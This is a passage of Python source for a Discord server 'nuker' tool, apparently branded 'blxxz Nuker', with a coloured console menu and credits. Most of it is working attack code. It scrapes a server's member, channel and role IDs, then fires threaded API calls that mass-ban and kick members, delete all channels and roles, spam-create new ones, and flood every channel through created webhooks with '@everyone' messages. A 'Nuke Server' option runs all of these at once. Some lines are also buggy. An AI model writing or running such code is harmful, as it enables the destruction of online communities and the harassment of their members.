            if 'retry_after' in r.text:
                time.sleep(r.json()['retry_after'])
            else:
                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                    print(f"{self.colour}[{self.colour}{Fore.GREEN}√{Fore.GREEN}{self.colour}]{self.colour} {Fore.WHITE}· {self.colour}[{self.colour}{Fore.LIGHTBLACK_EX}{ok}{Fore.LIGHTBLACK_EX}{self.colour}]{self.colour} Succesfully Kicked {self.colour} {Fore.WHITE}{member.strip()}")
                    break
                else:
                    break

                ##################^^^Kick Members^^^##################

    def DeleteChannels(self, guild, channel):
        while True:
            r = requests.delete(f"https://discord.com/api/v8/channels/{channel}", headers=headers)
            if 'retry_after' in r.text:
                time.sleep(r.json()['retry_after'])
            else:
                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                    print(f"{self.colour}[{self.colour}{Fore.GREEN}√{Fore.GREEN}{self.colour}]{self.colour} {Fore.WHITE}· {self.colour}[{self.colour}{Fore.LIGHTBLACK_EX}{ok}{Fore.LIGHTBLACK_EX}{self.colour}]{self.colour} Succesfully Deleted {self.colour} {Fore.WHITE}{channel.strip()}")
                    break
                else:
                    break

                ##################^^^DeleteChannels^^^##################

    def DeleteRoles(self, guild, role):
        while True:
            r = requests.delete(f"https://discord.com/api/v8/guilds/{guild}/roles/{role}", headers=headers)
            if 'retry_after' in r.text:
                time.sleep(r.json()['retry_after'])
            else:
                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                    print(f"{self.colour}[{self.colour}{Fore.GREEN}√{Fore.GREEN}{self.colour}]{self.colour} {Fore.WHITE}· {self.colour}[{self.colour}{Fore.LIGHTBLACK_EX}{ok}{Fore.LIGHTBLACK_EX}{self.colour}]{self.colour} Succesfully Deleted {self.colour} {Fore.WHITE}{role.strip()}")
                    break
                else:
                    break
                
                ##################^^^DeleteRoles^^^##################

    def SpamChannels(self, guild, name):
        while True:
            json = {'name': name, 'type': 0}
            r = requests.post(f'https://discord.com/api/v8/guilds/{guild}/channels', headers=headers, json=json)
            if 'retry_after' in r.text:
                time.sleep(r.json()['retry_after'])
            else:
                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                    print(f"{self.colour}[{self.colour}{Fore.GREEN}√{Fore.GREEN}{self.colour}]{self.colour} {Fore.WHITE}· {self.colour}[{self.colour}{Fore.LIGHTBLACK_EX}{ok}{Fore.LIGHTBLACK_EX}{self.colour}]{self.colour} Succesfully Created {self.colour} {Fore.WHITE}{name}")
                    break
                else:
                    break

                ##################^^^ChannelSpammer^^^##################

    def SpamRoles(self, guild, name):
        while True:
            json = {'name': name}
            r = requests.post(f'https://discord.com/api/v8/guilds/{guild}/roles', headers=headers, json=json)
            if 'retry_after' in r.text:
                time.sleep(r.json()['retry_after'])
            else:
                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                    print(f"{self.colour}[{self.colour}{Fore.GREEN}√{Fore.GREEN}{self.colour}]{self.colour} {Fore.WHITE}· {self.colour}[{self.colour}{Fore.LIGHTBLACK_EX}{ok}{Fore.LIGHTBLACK_EX}{self.colour}]{self.colour} Succesfully Created {self.colour} {Fore.WHITE}{name}")
                    break
                else:
                    break

                ##################^^^RoleSpammer^^^##################

    async def Scrape(self):
        guild = input(f'{self.colour}[{self.colour}{Fore.GREEN}√{Fore.GREEN}{self.colour}]{self.colour} {Fore.WHITE}· {self.colour}[{self.colour}{Fore.LIGHTBLACK_EX}{ok}{Fore.LIGHTBLACK_EX}{self.colour}]{self.colour} Server Id: {Fore.WHITE}')
        await client.wait_until_ready()
        guildOBJ = client.get_guild(int(guild))
        members = await guildOBJ.chunk()

        try:
            os.remove("Scraped/members.txt")
            os.remove("Scraped/channels.txt")
            os.remove("Scraped/roles.txt")
        except:
            pass

        membercount = 0
        with open('Scraped/members.txt', 'a') as m:
            for member in members:
                m.write(str(member.id) + "\n")
                membercount += 1
            print(f"\n· {self.colour}[{self.colour}{Fore.LIGHTBLACK_EX}{ok}{Fore.LIGHTBLACK_EX}{self.colour}]{self.colour} Succesfully Scraped {self.colour} {Fore.WHITE}{membercount} Members")
            m.close()

        channelcount = 0
        with open('Scraped/channels.txt', 'a') as c:
            for channel in guildOBJ.channels:
                c.write(str(channel.id) + "\n")
                channelcount += 1
            print(f"· {self.colour}[{self.colour}{Fore.LIGHTBLACK_EX}{ok}{Fore.LIGHTBLACK_EX}{self.colour}]{self.colour} Succesfully Scraped {self.colour} {Fore.WHITE}{channelcount} Channels")
            c.close()

        rolecount = 0
        with open('Scraped/roles.txt', 'a') as r:
            for role in guildOBJ.roles:
                r.write(str(role.id) + "\n")
                rolecount += 1
            print(f"· {self.colour}[{self.colour}{Fore.LIGHTBLACK_EX}{ok}{Fore.LIGHTBLACK_EX}{self.colour}]{self.colour} Succesfully Scraped {self.colour} {Fore.WHITE}{rolecount} Roles")
            r.close()

    async def NukeExecute(self):
        guild = input(f'· {Fore.RESET}· {self.colour}[{self.colour}{Fore.LIGHTBLACK_EX}{ok}{Fore.LIGHTBLACK_EX}{self.colour}]{self.colour} Server Id: {Fore.WHITE}')
        channel_name = input(f"{Fore.RESET}· {self.colour}[{self.colour}{Fore.LIGHTBLACK_EX}{ok}{Fore.LIGHTBLACK_EX}{self.colour}]{self.colour} Name Of Channels: {Fore.WHITE}")
        channel_amount = input(f"{Fore.RESET}· {self.colour}[{self.colour}{Fore.LIGHTBLACK_EX}{ok}{Fore.LIGHTBLACK_EX}{self.colour}]{self.colour} Amount Of Channels: {Fore.WHITE}")
        role_name = input(f"{Fore.RESET}· {self.colour}[{self.colour}{Fore.LIGHTBLACK_EX}{ok}{Fore.LIGHTBLACK_EX}{self.colour}]{self.colour} Name Of Roles: {Fore.WHITE}")
        role_amount = input(f"{Fore.RESET}· {self.colour}[{self.colour}{Fore.LIGHTBLACK_EX}{ok}{Fore.LIGHTBLACK_EX}{self.colour}]{self.colour} Amount Of Roles: {Fore.WHITE}")
        print()

        members = open('Scraped/members.txt')
        channels = open('Scraped/channels.txt')
        roles = open('Scraped/roles.txt')

        for member in members:
            threading.Thread(target=self.BanMembers, args=(guild, member,)).start()
        for channel in channels:
            threading.Thread(target=self.DeleteChannels, args=(guild, channel,)).start()
        for role in roles:
            threading.Thread(target=self.DeleteRoles, args=(guild, role,)).start()
        for i in range(int(channel_amount)):
            threading.Thread(target=self.SpamChannels, args=(guild, channel_name,)).start()
        for i in range(int(role_amount)):
            threading.Thread(target=self.SpamRoles, args=(guild, role_name,)).start()
        members.close()
        channels.close()
        roles.close()

        ##################^^^Scraper!! Request: https://cdn.discordapp.com/attachments/788673948266790982/846317672517468160/Scraped.rar^^^##################

    async def BanExecute(self):
        guild = input(f'{Fore.RESET}· {self.colour}[{self.colour}{Fore.LIGHTBLACK_EX}{ok}{Fore.LIGHTBLACK_EX}{self.colour}]{self.colour} Server Id: {Fore.WHITE}')
        print()
        members = open('Scraped/members.txt')
        for member in members:
            threading.Thread(target=self.BanMembers, args=(guild, member,)).start()
        members.close()

        ##################^^^BanMembers^^^##################

    async def KickExecute(self):
        guild = input(f'{Fore.RESET}· {self.colour}[{self.colour}{Fore.LIGHTBLACK_EX}{ok}{Fore.LIGHTBLACK_EX}{self.colour}]{self.colour} Server Id: {Fore.WHITE}')
        print()
        members = open('Scraped/members.txt')
        for member in members:
            threading.Thread(target=self.KickMembers, args=(guild, member,)).start()
        members.close()

        ##################^^^KickMembers^^^##################

    async def ChannelDeleteExecute(self):
        guild = input(f'{Fore.RESET}· {self.colour}[{self.colour}{Fore.LIGHTBLACK_EX}{ok}{Fore.LIGHTBLACK_EX}{self.colour}]{self.colour} Server Id: {Fore.WHITE}')
        print()
        channels = open('Scraped/channels.txt')
        for channel in channels:
            threading.Thread(target=self.DeleteChannels, args=(guild, channel,)).start()
        channels.close()

        ##################^^^DeleteChannels^^^##################

    async def RoleDeleteExecute(self):
        guild = input(f'{Fore.RESET}· {self.colour}[{self.colour}{Fore.LIGHTBLACK_EX}{ok}{Fore.LIGHTBLACK_EX}{self.colour}]{self.colour} Server Id: {Fore.WHITE}')
        print()
        roles = open('Scraped/roles.txt')
        for role in roles:
            threading.Thread(target=self.DeleteRoles, args=(guild, role,)).start()
        roles.close()

        ##################^^^RoleDeletor^^^##################

    async def ChannelSpamExecute(self):
        guild = input(f'{Fore.RESET}· {self.colour}[{self.colour}{Fore.LIGHTBLACK_EX}{ok}{Fore.LIGHTBLACK_EX}{self.colour}]{self.colour} Server Id: {Fore.WHITE}')
        name = input(f"{Fore.RESET}· {self.colour}[{self.colour}{Fore.LIGHTBLACK_EX}{ok}{Fore.LIGHTBLACK_EX}{self.colour}]{self.colour} Name Of Channels: {Fore.WHITE}")
        amount = input(f"{Fore.RESET}· {self.colour}[{self.colour}{Fore.LIGHTBLACK_EX}{ok}{Fore.LIGHTBLACK_EX}{self.colour}]{self.colour} Amount Of Channels: {Fore.WHITE}")
        print()
        for i in range(int(amount)):
            threading.Thread(target=self.SpamChannels, args=(guild, name,)).start()

            ##################^^^ChannelSpam^^^##################

    async def RoleSpamExecute(self):
        guild = input(f'{Fore.RESET}· {self.colour}[{self.colour}{Fore.LIGHTBLACK_EX}{ok}{Fore.LIGHTBLACK_EX}{self.colour}]{self.colour} Server Id: {Fore.LIGHTBLACK_EX}')
        name = input(f"{Fore.RESET}· {self.colour}[{self.colour}{Fore.LIGHTBLACK_EX}{ok}{Fore.LIGHTBLACK_EX}{self.colour}]{self.colour} Name Of Roles: {Fore.LIGHTBLACK_EX}")
        amount = input(f"{Fore.RESET}· {self.colour}[{self.colour}{Fore.LIGHTBLACK_EX}{ok}{Fore.LIGHTBLACK_EX}{self.colour}]{self.colour} Amount Of Roles: {Fore.LIGHTBLACK_EX}")
        print()
        for i in range(int(amount)):
            threading.Thread(target=self.SpamRoles, args=(guild, name,)).start()

            ##################^^^SpamRoles^^^##################

    async def PruneMembers(self):
        guild = input(f'{Fore.RESET}· {self.colour}[{self.colour}{Fore.LIGHTBLACK_EX}{ok}{Fore.LIGHTBLACK_EX}{self.colour}]{self.colour} Server Id: {Fore.LIGHTBLACK_EX}')
        print()
        await guild.prune_members(days=1, compute_prune_count=False, roles=guild.roles)

        ##################^^^pruneMembers^^^##################

    def WebhookSend(self, webhook, message): #credits to mkrs
        while True:
            json = {
                'content': message if message != '' else "@everyone BLXXZ ON TOP",
                'tts': False,
                'username': 'blxxz'
            }
            r = requests.post(f'{webhook}', json=json)
            if r.status_code == 429:
                  time.sleep(r.json()['retry_after'])
                  self.WebhookSend(webhook, message)
                  break
            else:
                if r.status_code == 204 or 201 or 200:
                    print(f"{colors.purple}[{colors.purple}{Fore.GREEN}√{Fore.GREEN}{colors.purple}]{colors.purple} {Fore.WHITE}· {colors.purple}[{colors.purple}{Fore.WHITE}{ok}{Fore.WHITE}{colors.purple}] {colors.purple}[{colors.purple}{Fore.WHITE}Client{Fore.WHITE}{colors.purple}] {Fore.LIGHTBLACK_EX} punished client sent {colors.purple} {colors.purplu} {message}")
                    break
                else:
                    break

                ##################^^^MODULESforWebhookSpammer^^^##################


    
    async def SpamWebhook(self, guild_id, amount, message):
        guild = client.get_guild(int(guild_id))
        web_urls = []
        for channel in guild.text_channels:
            try:
                webhook = await channel.create_webhook(name='DISCORD.GG/URIFROM', reason="BLXXZ NUKER")
                print(f"{colors.purple}[{colors.purple}{Fore.GREEN}√{Fore.GREEN}{colors.purple}]{colors.purple} {Fore.WHITE}· {colors.purple}[{colors.purple}{Fore.WHITE}{ok}{Fore.WHITE}{colors.purple}] {colors.purple}[{colors.purple}{Fore.WHITE}Client{Fore.WHITE}{colors.purple}] {Fore.LIGHTBLACK_EX} punished client created webhook")
                web_urls.append(webhook.url)
            except Exception as e:
                print(e)
        for url in web_urls:
              for i in range(amount):
               try:
                  threading.Thread(target=self.WebhookSend, args=(url, message,)).start()
               except Exception as e:
                 print(e)

                 ##################^^^WEBHOOKspammer^^^##################

##################################################################################^^^SCRIPTS^^^###################################################################################################################                 


##################################################################################vvv Credits vvv###################################################################################################################

##################vvv credits menu vvv##################

    def Credits(self):
        os.system(f'')
        print(f'''
''')

    def Credits(self):
        os.system(f'cls & title [blxxz Nuker] » Credits')
        print(f'''
                          {self.colour}╔╗ ╦  ═╗ ╦═╗ ╦╔═╗ ╔╗╔╦ ╦╦╔═╔═╗╦═╗
                          \033[90m╠╩╗║  ╔╩╦╝╔╩╦╝╔═╝ ║║║║ ║╠╩╗║╣ ╠╦╝
                          \033[37m╚═╝╩═╝╩ ╚═╩ ╚═╚═╝ ╝╚╝╚═╝╩ ╩╚═╝╩╚═

                            \033[37m[{self.colour}Discord\033[37m] \033[37m! blxxz#0001
                            \033[37m[{self.colour}Coded by\033[37m] \033[37mUrifrom/blxxz
                            \033[37m[{self.colour}Desing thanks to: \033[37m] \033[37mAvery Nuker
                            \033[37m[{self.colour}Website\033[37m] \033[37mhttps://urifrom.xyz
                            \033[37m[{self.colour}Server\033[37m] \033[37m.gg/urifrom




        \033[37m''')

##################################################################################^^^ Credits END ^^^###################################################################################################################



##################################################################################vvv Theme Changer LOADER vvv################################################################################################################### 

    async def ThemeChanger(self):
        os.system(f'cls & title [blxxz Nuker] » Themes')
        print(f"""



                         {Fore.LIGHTBLACK_EX}╔╗ ╦  ═╗ ╦═╗ ╦╔═╗  ╔╦╗╦ ╦╔═╗╔╦╗╔═╗╔═╗
                         ╠╩╗║  ╔╩╦╝╔╩╦╝╔═╝   ║ ╠═╣║╣ ║║║║╣ ╚═╗
                         ╚═╝╩═╝╩ ╚═╩ ╚═╚═╝   ╩ ╩ ╩╚═╝╩ ╩╚═╝╚═╝
                       ═══════════════════════════════════════════
                             ══════════════════════════════





             
        \033[37m""")

        time.sleep(1)
        os.system('cls')
        print(f"""



                         {self.colour}╔╗ {Fore.LIGHTBLACK_EX}╦  ═╗ ╦═╗ ╦╔═╗  ╔╦╗╦ ╦╔═╗╔╦╗╔═╗╔═╗
                         {self.colour}╠╩╗{Fore.LIGHTBLACK_EX}║  ╔╩╦╝╔╩╦╝╔═╝   ║ ╠═╣║╣ ║║║║╣ ╚═╗
                         {self.colour}╚═╝{Fore.LIGHTBLACK_EX}╩═╝╩ ╚═╩ ╚═╚═╝   ╩ ╩ ╩╚═╝╩ ╩╚═╝╚═╝
                       ═══════════════════════════════════════════
                             ══════════════════════════════





          
        """)
        time.sleep(1)
        os.system('cls')
        print(f"""



                         {self.colour}╔╗ {Fore.LIGHTBLACK_EX}{self.colour}╦  {Fore.LIGHTBLACK_EX}═╗ ╦═╗ ╦╔═╗  ╔╦╗╦ ╦╔═╗╔╦╗╔═╗╔═╗
                         {self.colour}╠╩╗{Fore.LIGHTBLACK_EX}{self.colour}║  {Fore.LIGHTBLACK_EX}╔╩╦╝╔╩╦╝╔═╝   ║ ╠═╣║╣ ║║║║╣ ╚═╗
                         {self.colour}╚═╝{Fore.LIGHTBLACK_EX}{self.colour}╩═╝{Fore.LIGHTBLACK_EX}╩ ╚═╩ ╚═╚═╝   ╩ ╩ ╩╚═╝╩ ╩╚═╝╚═╝
                       ═══════════════════════════════════════════
                             ══════════════════════════════





          
        """)
        time.sleep(1)
        os.system('cls')
        print(f"""



                         {self.colour}╔╗ {Fore.LIGHTBLACK_EX}{self.colour}╦  {Fore.LIGHTBLACK_EX}{self.colour}═╗ ╦{Fore.LIGHTBLACK_EX}═╗ ╦╔═╗  ╔╦╗╦ ╦╔═╗╔╦╗╔═╗╔═╗
                         {self.colour}╠╩╗{Fore.LIGHTBLACK_EX}{self.colour}║  {Fore.LIGHTBLACK_EX}{self.colour}╔╩╦╝{Fore.LIGHTBLACK_EX}╔╩╦╝╔═╝   ║ ╠═╣║╣ ║║║║╣ ╚═╗
                         {self.colour}╚═╝{Fore.LIGHTBLACK_EX}{self.colour}╩═╝{Fore.LIGHTBLACK_EX}{self.colour}╩ ╚═{Fore.LIGHTBLACK_EX}╩ ╚═╚═╝   ╩ ╩ ╩╚═╝╩ ╩╚═╝╚═╝
                       ═══════════════════════════════════════════
                             ══════════════════════════════





          
        """)
        time.sleep(1)
        os.system('cls')
        print(f"""



                         {self.colour}╔╗ {Fore.LIGHTBLACK_EX}{self.colour}╦  {Fore.LIGHTBLACK_EX}{self.colour}═╗ ╦{Fore.LIGHTBLACK_EX}{self.colour}═╗ ╦{Fore.LIGHTBLACK_EX}╔═╗  ╔╦╗╦ ╦╔═╗╔╦╗╔═╗╔═╗
                         {self.colour}╠╩╗{Fore.LIGHTBLACK_EX}{self.colour}║  {Fore.LIGHTBLACK_EX}{self.colour}╔╩╦╝{Fore.LIGHTBLACK_EX}{self.colour}╔╩╦╝{Fore.LIGHTBLACK_EX}╔═╝   ║ ╠═╣║╣ ║║║║╣ ╚═╗
                         {self.colour}╚═╝{Fore.LIGHTBLACK_EX}{self.colour}╩═╝{Fore.LIGHTBLACK_EX}{self.colour}╩ ╚═{Fore.LIGHTBLACK_EX}{self.colour}╩ ╚═{Fore.LIGHTBLACK_EX}╚═╝   ╩ ╩ ╩╚═╝╩ ╩╚═╝╚═╝
                       ═══════════════════════════════════════════
                             ══════════════════════════════





          
        """)
        time.sleep(1)
        os.system('cls')
        print(f"""



                         {self.colour}╔╗ {Fore.LIGHTBLACK_EX}{self.colour}╦  {Fore.LIGHTBLACK_EX}{self.colour}═╗ ╦{Fore.LIGHTBLACK_EX}{self.colour}═╗ ╦{Fore.LIGHTBLACK_EX}{self.colour}╔═╗  {Fore.LIGHTBLACK_EX}╔╦╗╦ ╦╔═╗╔╦╗╔═╗╔═╗
                         {self.colour}╠╩╗{Fore.LIGHTBLACK_EX}{self.colour}║  {Fore.LIGHTBLACK_EX}{self.colour}╔╩╦╝{Fore.LIGHTBLACK_EX}{self.colour}╔╩╦╝{Fore.LIGHTBLACK_EX}{self.colour}╔═╝  {Fore.LIGHTBLACK_EX} ║ ╠═╣║╣ ║║║║╣ ╚═╗
                         {self.colour}╚═╝{Fore.LIGHTBLACK_EX}{self.colour}╩═╝{Fore.LIGHTBLACK_EX}{self.colour}╩ ╚═{Fore.LIGHTBLACK_EX}{self.colour}╩ ╚═{Fore.LIGHTBLACK_EX}{self.colour}╚═╝  {Fore.LIGHTBLACK_EX} ╩ ╩ ╩╚═╝╩ ╩╚═╝╚═╝
                       {self.colour}═══════════════════════════════════════════
                             ══════════════════════════════





          
        """)
        time.sleep(1)
        os.system('cls')
        print(f"""



                         {self.colour}╔╗ {Fore.LIGHTBLACK_EX}{self.colour}╦  {Fore.LIGHTBLACK_EX}{self.colour}═╗ ╦{Fore.LIGHTBLACK_EX}{self.colour}═╗ ╦{Fore.LIGHTBLACK_EX}{self.colour}╔═╗  {Fore.LIGHTBLACK_EX}╔╦╗╦ ╦╔═╗╔╦╗╔═╗╔═╗
                         {self.colour}╠╩╗{Fore.LIGHTBLACK_EX}{self.colour}║  {Fore.LIGHTBLACK_EX}{self.colour}╔╩╦╝{Fore.LIGHTBLACK_EX}{self.colour}╔╩╦╝{Fore.LIGHTBLACK_EX}{self.colour}╔═╝  {Fore.LIGHTBLACK_EX} ║ ╠═╣║╣ ║║║║╣ ╚═╗
                         {self.colour}╚═╝{Fore.LIGHTBLACK_EX}{self.colour}╩═╝{Fore.LIGHTBLACK_EX}{self.colour}╩ ╚═{Fore.LIGHTBLACK_EX}{self.colour}╩ ╚═{Fore.LIGHTBLACK_EX}{self.colour}╚═╝  {self.colour} ╩ ╩ ╩╚═╝╩ ╩╚═╝╚═╝
                       {self.colour}═══════════════════════════════════════════
                             {self.colour}══════════════════════════════





          
        """)
        time.sleep(1)
        os.system('cls')
        print(f"""



                         {self.colour}╔╗ {Fore.LIGHTBLACK_EX}{self.colour}╦  {Fore.LIGHTBLACK_EX}{self.colour}═╗ ╦{Fore.LIGHTBLACK_EX}{self.colour}═╗ ╦{Fore.LIGHTBLACK_EX}{self.colour}╔═╗  {Fore.LIGHTBLACK_EX}╔╦╗╦ ╦╔═╗╔╦╗╔═╗╔═╗
                         {self.colour}╠╩╗{Fore.LIGHTBLACK_EX}{self.colour}║  {Fore.LIGHTBLACK_EX}{self.colour}╔╩╦╝{Fore.LIGHTBLACK_EX}{self.colour}╔╩╦╝{Fore.LIGHTBLACK_EX}{self.colour}╔═╝  {Fore.LIGHTBLACK_EX} ║ ╠═╣║╣ ║║║║╣ ╚═╗
                         {self.colour}╚═╝{Fore.LIGHTBLACK_EX}{self.colour}╩═╝{Fore.LIGHTBLACK_EX}{self.colour}╩ ╚═{Fore.LIGHTBLACK_EX}{self.colour}╩ ╚═{Fore.LIGHTBLACK_EX}{self.colour}╚═╝  {self.colour} ╩ ╩ ╩╚═╝╩ ╩╚═╝╚═╝
                       {self.colour}═══════════════════════════════════════════
                             {self.colour}══════════════════════════════





          
        """)
        time.sleep(1)
        os.system('cls')
        print(f"""



                         {self.colour}╔╗ {Fore.LIGHTBLACK_EX}{self.colour}╦  {Fore.LIGHTBLACK_EX}{self.colour}═╗ ╦{Fore.LIGHTBLACK_EX}{self.colour}═╗ ╦{Fore.LIGHTBLACK_EX}{self.colour}╔═╗  {Fore.WHITE}╔╦╗╦ ╦╔═╗╔╦╗╔═╗╔═╗
                         {self.colour}╠╩╗{Fore.LIGHTBLACK_EX}{self.colour}║  {Fore.LIGHTBLACK_EX}{self.colour}╔╩╦╝{Fore.LIGHTBLACK_EX}{self.colour}╔╩╦╝{Fore.LIGHTBLACK_EX}{self.colour}╔═╝  {Fore.LIGHTBLACK_EX} ║ ╠═╣║╣ ║║║║╣ ╚═╗
                         {self.colour}╚═╝{Fore.LIGHTBLACK_EX}{self.colour}╩═╝{Fore.LIGHTBLACK_EX}{self.colour}╩ ╚═{Fore.LIGHTBLACK_EX}{self.colour}╩ ╚═{Fore.LIGHTBLACK_EX}{self.colour}╚═╝  {self.colour} ╩ ╩ ╩╚═╝╩ ╩╚═╝╚═╝
                       {self.colour}═══════════════════════════════════════════
                             {self.colour}══════════════════════════════





          
        """)
        
        ########################################################################vvv ChangeThemes MAIN MENU vvv##############################################################################################################################

        time.sleep(1)
        os.system('cls')
        print(f"""



                         {self.colour}╔╗ {Fore.LIGHTBLACK_EX}{self.colour}╦  {Fore.LIGHTBLACK_EX}{self.colour}═╗ ╦{Fore.LIGHTBLACK_EX}{self.colour}═╗ ╦{Fore.LIGHTBLACK_EX}{self.colour}╔═╗  {Fore.WHITE}╔╦╗╦ ╦╔═╗╔╦╗╔═╗╔═╗
                         {self.colour}╠╩╗{Fore.LIGHTBLACK_EX}{self.colour}║  {Fore.LIGHTBLACK_EX}{self.colour}╔╩╦╝{Fore.LIGHTBLACK_EX}{self.colour}╔╩╦╝{Fore.LIGHTBLACK_EX}{self.colour}╔═╝  {Fore.LIGHTBLACK_EX} ║ ╠═╣║╣ ║║║║╣ ╚═╗
                         {self.colour}╚═╝{Fore.LIGHTBLACK_EX}{self.colour}╩═╝{Fore.LIGHTBLACK_EX}{self.colour}╩ ╚═{Fore.LIGHTBLACK_EX}{self.colour}╩ ╚═{Fore.LIGHTBLACK_EX}{self.colour}╚═╝  {self.colour} ╩ ╩ ╩╚═╝╩ ╩╚═╝╚═╝
                       {self.colour}═══════════════════════════════════════════
                             {self.colour}══════════════════════════════








      {self.colour}╔═══════════════════════╦═══════════════════════╦═══════════════════════╗\033[37m
      {self.colour}║ \033[37m[{self.colour}1\033[37m] \033[37mRed               {self.colour}║\033[37m [{self.colour}5\033[37m] \033[37mPurple            {self.colour}║\033[37m [{self.colour}9\033[37m] \033[37mGrey              {self.colour}║\033[37m
      {self.colour}║ \033[37m[{self.colour}2\033[37m] \033[37mGreen             {self.colour}║\033[37m [{self.colour}6\033[37m] \033[37mBlue              {self.colour}║\033[37m [{self.colour}0\033[37m] \033[37mPeach             {self.colour}║\033[37m
      {self.colour}║ \033[37m[{self.colour}3\033[37m] \033[37mYellow            {self.colour}║\033[37m [{self.colour}7\033[37m] \033[37mPink              {self.colour}║\033[37m [{self.colour}M\033[37m] \033[37mMenu              {self.colour}║\033[37m
      {self.colour}║ \033[37m[{self.colour}4\033[37m] \033[37mOrange            {self.colour}║\033[37m [{self.colour}8\033[37m] \033[37mCyan              {self.colour}║\033[37m [{self.colour}X\033[37m] \033[37mExit              {self.colour}║\033[37m
      {self.colour}╚═══════════════════════╩═══════════════════════╩═══════════════════════╝\033[37m


          
        """)
        choice = input(f'· {self.colour}[{self.colour}{Fore.WHITE}{ok}{Fore.WHITE}{self.colour}]{self.colour} {self.colour} Choice{Fore.LIGHTBLACK_EX}:{Fore.LIGHTBLACK_EX} {Fore.WHITE}')


##################vvv Themes Chooise vvv##################

        if choice == '1':
            self.colour = '\x1b[38;5;196m'
            await self.ThemeChanger()
        elif choice == '2':
            self.colour = '\x1b[38;5;34m'
            await self.ThemeChanger()
        elif choice == '3':
            self.colour = '\x1b[38;5;142m'
            await self.ThemeChanger()
        elif choice == '4':
            self.colour = '\x1b[38;5;172m'
            await self.ThemeChanger()
        elif choice == '5':
            self.colour = '\x1b[38;5;56m'
            await self.ThemeChanger()
        elif choice == '6':
            self.colour = '\x1b[38;5;21m'
            await self.ThemeChanger()
        elif choice == '7':
            self.colour = '\x1b[38;5;201m'
            await self.ThemeChanger()
        elif choice == '8':
            self.colour = '\x1b[38;5;51m'
            await self.ThemeChanger()
        elif choice == '9':
            self.colour = '\x1b[38;5;103m'
            await self.ThemeChanger()
        elif choice == '0':
            self.colour = '\x1b[38;5;209m'
            await self.ThemeChanger()
        elif choice == 'M' or choice == 'm':
            await self.Menu()
        elif choice == 'X' or choice == 'x':
            os._exit(0)


##################################################################################^^^Theme Changer END^^^###################################################################################################################

##################################################################################vvv NUKER MAIN MENU vvv###################################################################################################################

    async def Menu(self):
        os.system(f'cls & title [blxxz Main] - Connected  » {client.user}.   License: LifeTime')
        print(f'''
                            



                                      {Fore.WHITE}╔╗ ╦  ═╗ ╦═╗ ╦╔═╗
                                      {Fore.LIGHTBLACK_EX}╠╩╗║  ╔╩╦╝╔╩╦╝╔═╝
                                      {self.colour}╚═╝╩═╝╩ ╚═╩ ╚═╚═╝
                               ═══════════════════════════════
                                  ═════════════════════════




          {self.colour}                        ╔═══════════════════════╗
          {self.colour}                        ║\033[37m [{self.colour}h\033[37m] \033[37mWebhook Destoryer{self.colour} ║
          {self.colour}╔═══════════════════════║═══════════════════════║═══════════════════════╗\033[37m
          {self.colour}║ \033[37m[{self.colour}1\033[37m] \033[37mBan Members       {self.colour}║\033[37m [{self.colour}5\033[37m] \033[37mChannel Deletor   {self.colour}║\033[37m [{self.colour}9\033[37m] \033[37mScrape Info       {self.colour}║\033[37m
          {self.colour}║ \033[37m[{self.colour}2\033[37m] \033[37mKick Members      {self.colour}║\033[37m [{self.colour}6\033[37m] \033[37mRole Creator      {self.colour}║\033[37m [{self.colour}0\033[37m] \033[37mChange Themes     {self.colour}║\033[37m
          {self.colour}║ \033[37m[{self.colour}3\033[37m] \033[37mPrune Members     {self.colour}║\033[37m [{self.colour}7\033[37m] \033[37mChannel Creator   {self.colour}║\033[37m [{self.colour}C\033[37m] \033[37mView Credits      {self.colour}║\033[37m
          {self.colour}║ \033[37m[{self.colour}4\033[37m] \033[37mRole Deletor      {self.colour}║\033[37m [{self.colour}8\033[37m] \033[37mNuke Server       {self.colour}║\033[37m [{self.colour}X\033[37m] \033[37mExit              {self.colour}║\033[37m
          {self.colour}╚═══════════════════════╩═══════════════════════╩═══════════════════════╝\033[37m
             
        \033[37m''')


##################vvv CHOOISE vvv##################

        choice = input(f'· {self.colour}[{self.colour}{Fore.WHITE}{ok}{Fore.WHITE}{self.colour}]{self.colour} {self.colour} Choice{Fore.LIGHTBLACK_EX}:{Fore.LIGHTBLACK_EX}{Fore.WHITE}')
        if choice == '1':
            await self.BanExecute()
            time.sleep(2)
            await self.Menu()
        elif choice == '2':
            await self.KickExecute()
            time.sleep(2)
            await self.Menu()
        elif choice == '3':
            await self.PruneMembers()
            time.sleep(2)
            await self.Menu()
        elif choice == '4':
            await self.RoleDeleteExecute()
            time.sleep(2)
            await self.Menu()
        elif choice == '5':
            await self.ChannelDeleteExecute()
            time.sleep(2)
            await self.Menu()
        elif choice == '6':
            await self.RoleSpamExecute()
            time.sleep(2)
            await self.Menu()
        elif choice == '7':
            await self.ChannelSpamExecute()
            time.sleep(2)
            await self.Menu()
        elif choice == '8':
            await self.NukeExecute()
            time.sleep(2)
            await self.Menu()
        elif choice == '9':
            await self.Scrape()
            time.sleep(3)
            await self.Menu()
        elif choice == '0':
            await self.ThemeChanger()
        elif choice == 'C' or choice == 'c':
            self.Credits()
            input()
            await self.Menu()
        elif choice == 'X' or choice == 'x':
            os._exit(0)
        elif choice == 'H' or choice == 'h':
            amount = int(input(f"{self.colour}[{self.colour}{Fore.GREEN}√{Fore.GREEN}{self.colour}]{self.colour} {Fore.WHITE}· {self.colour}[{self.colour}{Fore.WHITE}{ok}{Fore.WHITE}{self.colour}] {self.colour}[{self.colour}{Fore.WHITE}Client{Fore.WHITE}{self.colour}] {Fore.LIGHTBLACK_EX} How Many Messages?: {self.colour}"))
            guild_id = int(input(f"{self.colour}[{self.colour}{Fore.GREEN}√{Fore.GREEN}{self.colour}]{self.colour} {Fore.WHITE}· {self.colour}[{self.colour}{Fore.WHITE}{ok}{Fore.WHITE}{self.colour}] {self.colour}[{self.colour}{Fore.WHITE}Client{Fore.WHITE}{self.colour}] {Fore.LIGHTBLACK_EX} Server Id: {self.colour}"))
